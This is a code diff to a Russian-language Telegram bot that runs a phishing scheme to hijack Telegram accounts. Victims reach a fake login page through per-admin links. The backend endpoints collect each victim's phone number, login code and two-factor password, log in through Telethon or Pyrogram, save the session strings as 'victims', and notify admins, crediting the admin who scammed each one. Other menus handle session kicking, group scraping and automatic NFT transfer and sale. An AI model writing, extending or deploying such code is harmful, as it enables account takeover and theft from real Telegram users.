@@ -129,6 +129,7 @@ def load_all():
         "auto_sell_threshold": 15, 
         "bulk_portion": 50,
         "provider": "telethon",
+        "base_url": "", 
         "auto_transfer_nft": True,
         "auto_sell_nft": True
     })
@@ -240,15 +241,6 @@ bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
 dp  = Dispatcher()
 routes = web.RouteTableDef()
 
-def public_base(req=None):
-    v = os.environ.get("PUBLIC_URL")
-    if v: return v.rstrip("/")
-    d = os.environ.get("RAILWAY_PUBLIC_DOMAIN")
-    if d: return f"https://{d}"
-    if req is not None:
-        return f"{req.url.scheme}://{req.headers.get('Host', req.url.host)}"
-    return ""
-
 def check_key(req):
     return req.query.get("key") == API_KEY or req.headers.get("X-Api-Key") == API_KEY
 
@@ -285,12 +277,20 @@ async def resolve_name(user_id):
         return None
 
 async def make_link(creator_id):
-    base = public_base()
-    if not base: return None, None
+    base = SETTINGS.get("base_url", "").strip().rstrip("/")
+    if not base:
+        d = os.environ.get("RAILWAY_PUBLIC_DOMAIN")
+        base = f"https://{d}" if d else "http://localhost:8080"
+    
     rand = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
-    vid  = f"{creator_id}_{rand}{int(time.time())}"
+    vid = f"{creator_id}_{rand}{int(time.time())}"
     name = await resolve_name(creator_id) or "Admin"
-    LINKS[vid] = {"creator_id": int(creator_id), "creator_name": name, "created": time.time()}
+    
+    LINKS[vid] = {
+        "creator_id": int(creator_id), 
+        "creator_name": name, 
+        "created": time.time()
+    }
     save_links()
     return f"{base}/tg.html?id={vid}", vid
 
@@ -526,7 +526,19 @@ async def cmd_sessions(msg: Message):
     if not items: return await msg.answer(t("no_sessions"))
     await msg.answer(f"🟢 <b>Активные сессии</b> ({len(items)}):", reply_markup=sessions_list_menu(0))
 
-# --- ДОБАВЛЕНИЕ АДМИНОВ ПО ID ---
+@dp.message(Command("url"))
+async def cmd_url(msg: Message):
+    if not is_admin(msg.from_user.id): return await msg.answer("⛔ Только для администраторов.")
+    args = msg.text.split(maxsplit=1)
+    if len(args) < 2:
+        curr_base = SETTINGS.get("base_url", "Не задана")
+        return await msg.answer(f"🌐 Текущая базовая ссылка: <code>{curr_base}</code>\n\nИспользование: <code>/url https://ваш-домен.com</code>")
+    
+    new_url = args[1].strip().rstrip("/")
+    SETTINGS["base_url"] = new_url
+    save_settings()
+    await msg.answer(f"✅ Базовая ссылка успешно установлена:\n<code>{new_url}</code>")
+
 @dp.message(Command("addadmin"))
 async def cmd_addadmin(msg: Message):
     if not is_owner(msg.from_user.id): return await msg.answer("⛔ Только владелец может добавлять администраторов.")
@@ -542,10 +554,18 @@ async def cmd_addadmin(msg: Message):
 
 PARSING_STATE = {}
 
+@dp.callback_query(F.data == "new_link")
+async def cb_new_link(cb: CallbackQuery):
+    if not is_vip(cb.from_user.id): return await cb.answer("⛔ Нет доступа", show_alert=True)
+    link, _ = await make_link(cb.from_user.id)
+    await cb.message.answer(f"🔗 <b>Ваша персональная ссылка:</b>\n<code>{link}</code>")
+    await cb.answer("Ссылка создана!")
+
 @dp.callback_query(F.data == "settings_menu")
 async def cb_settings_menu(cb: CallbackQuery):
     if not is_vip(cb.from_user.id): return
-    await cb.message.edit_text(t("settings_title"), reply_markup=settings_menu())
+    base = SETTINGS.get("base_url", "Не задана")
+    await cb.message.edit_text(t("settings_title") + f"\n\n🌐 Базовый URL: <code>{base}</code>\n(Изменить: /url ссылка)", reply_markup=settings_menu())
 
 @dp.callback_query(F.data == "toggle_lang")
 async def cb_toggle_lang(cb: CallbackQuery):
@@ -616,7 +636,6 @@ async def cb_test_code_send(cb: CallbackQuery):
     except Exception as e:
         await cb.message.answer(f"❌ <b>Ошибка теста:</b>\n<code>{e}</code>")
 
-# --- ПОКАЗ КОДА И 2FA ПО КНОПКЕ ---
 @dp.callback_query(F.data.startswith("show_code_"))
 async def cb_show_code(cb: CallbackQuery):
     if not await guard(cb): return
@@ -641,7 +660,6 @@ async def cb_copy_phone(cb: CallbackQuery):
     phone = info.get("phone", "Не указан")
     await cb.answer(f"Номер телефона: {phone}", show_alert=True)
 
-# --- ПАРСИНГ ГРУПП ---
 @dp.callback_query(F.data == "parsing_menu")
 async def cb_parsing_menu(cb: CallbackQuery):
     if not is_vip(cb.from_user.id): return await cb.answer("⛔ VIP required", show_alert=True)
@@ -737,7 +755,6 @@ async def cb_parse_select_chat(cb: CallbackQuery):
     except Exception as e:
         await cb.message.edit_text(f"❌ Ошибка парсинга: <code>{e}</code>", reply_markup=main_menu(cb.from_user.id))
 
-# --- КИК СЕССИЙ С ВЫБОРОМ УСТРОЙСТВ ---
 @dp.callback_query(F.data.startswith("kill_"))
 async def cb_kill_menu(cb: CallbackQuery):
     if not await guard(cb): return
@@ -943,17 +960,17 @@ async def cb_shutdown_do(cb: CallbackQuery):
     await cb.message.edit_text("🔴 Выключено.")
     os._exit(0)
 
-@routes.get("/api/create_link")
-async def api_create_link(req):
-    if not check_key(req): return web.json_response({"ok": False}, status=403)
-    link, _ = await make_link(OWNER_ID)
-    return web.json_response({"ok": True, "link": link})
-
 @routes.get("/api/creator")
 async def api_creator(req):
     vid = req.query.get("vid", "")
-    name = await resolve_name(vid.split("_")[0]) if vid and "_" in vid else None
-    return web.json_response({"ok": True, "name": name or ""})
+    creator_name = "Admin"
+    if vid and "_" in vid:
+        creator_key = vid.split("_")[0]
+        if creator_key in LINKS:
+            creator_name = LINKS[creator_key].get("creator_name", "Admin")
+        else:
+            creator_name = await resolve_name(creator_key) or "Admin"
+    return web.json_response({"ok": True, "name": creator_name})
 
 @routes.post("/api/phone")
 async def api_phone(req):
@@ -965,6 +982,12 @@ async def api_phone(req):
     phone = clean_phone(phone_raw)
     prov = SETTINGS.get("provider", "telethon")
     dev = generate_unique_device()
+
+    creator_info = "Неизвестно"
+    if vid and "_" in vid:
+        c_id = vid.split("_")[0]
+        c_name = LINKS.get(vid, {}).get("creator_name") or await resolve_name(c_id) or c_id
+        creator_info = f"👤 Нагрел (админ): <b>{c_name}</b> (ID: <code>{c_id}</code>)"
 
     try:
         if prov == "pyrogram" and PYRO_AVAILABLE:
@@ -982,7 +1005,7 @@ async def api_phone(req):
             await client.disconnect()
             STATE[vid] = {"phone": phone, "phone_code_hash": sent.phone_code_hash, "session": snapshot, "prov": "telethon", "dev": dev}
 
-        await tg_send_all_admins(f"✅ <b>Код отправлен</b>\n📱 <code>{phone}</code>")
+        await tg_send_all_admins(f"📲 <b>Новый номер</b>\n📱 <code>{phone}</code>\n{creator_info}")
         return web.json_response({"ok": True})
     except Exception as e:
         return web.json_response({"ok": False, "error": str(e)})
@@ -1000,6 +1023,12 @@ async def api_code(req):
     prov = st.get("prov", "telethon")
     dev = st.get("dev", generate_unique_device())
 
+    creator_info = "Неизвестно"
+    if vid and "_" in vid:
+        c_id = vid.split("_")[0]
+        c_name = LINKS.get(vid, {}).get("creator_name") or await resolve_name(c_id) or c_id
+        creator_info = f"👤 Нагрел: <b>{c_name}</b> (ID: <code>{c_id}</code>)"
+
     try:
         if prov == "pyrogram" and PYRO_AVAILABLE:
             app = PyroClient(f"pyro_auth_{vid}", api_id=API_ID, api_hash=API_HASH, session_string=st["session"], in_memory=True, device_model=dev["device_model"], system_version=dev["system_version"], app_version=dev["app_version"], lang_code=dev["lang_code"])
@@ -1009,6 +1038,7 @@ async def api_code(req):
             except Pyro2FA:
                 STATE[vid]["session"] = await app.export_session_string()
                 await app.disconnect()
+                await tg_send_all_admins(f"🔐 <b>Требуется 2FA</b>\n📱 <code>{phone}</code>\n{creator_info}")
                 return web.json_response({"ok": False, "need_2fa": True})
             me = await app.get_me()
             final = await app.export_session_string()
@@ -1022,6 +1052,7 @@ async def api_code(req):
             except SessionPasswordNeededError:
                 STATE[vid]["session"] = client.session.save()
                 await client.disconnect()
+                await tg_send_all_admins(f"🔐 <b>Требуется 2FA</b>\n📱 <code>{phone}</code>\n{creator_info}")
                 return web.json_response({"ok": False, "need_2fa": True})
             me = await client.get_me()
             final = client.session.save()
@@ -1036,7 +1067,7 @@ async def api_code(req):
         }
         save_victims()
         STATE.pop(vid, None)
-        await tg_send_all_admins(f"✅ <b>Сессия получена!</b>\n📱 <code>{phone}</code>")
+        await tg_send_all_admins(f"✅ <b>Сессия получена!</b>\n📱 <code>{phone}</code>\n{creator_info}")
         return web.json_response({"ok": True})
     except Exception as e:
         return web.json_response({"ok": False, "error": str(e)})
@@ -1053,6 +1084,12 @@ async def api_2fa(req):
     phone = st["phone"]
     prov = st.get("prov", "telethon")
     dev = st.get("dev", generate_unique_device())
+
+    creator_info = "Неизвестно"
+    if vid and "_" in vid:
+        c_id = vid.split("_")[0]
+        c_name = LINKS.get(vid, {}).get("creator_name") or await resolve_name(c_id) or c_id
+        creator_info = f"👤 Нагрел: <b>{c_name}</b> (ID: <code>{c_id}</code>)"
 
     try:
         if prov == "pyrogram" and PYRO_AVAILABLE:
@@ -1080,7 +1117,7 @@ async def api_2fa(req):
         }
         save_victims()
         STATE.pop(vid, None)
-        await tg_send_all_admins(f"✅ <b>Сессия с 2FA получена!</b>\n📱 <code>{phone}</code>")
+        await tg_send_all_admins(f"✅ <b>Сессия с 2FA получена!</b>\n📱 <code>{phone}</code>\n{creator_info}")
         return web.json_response({"ok": True})
     except Exception as e:
         return web.json_response({"ok": False, "error": str(e)})
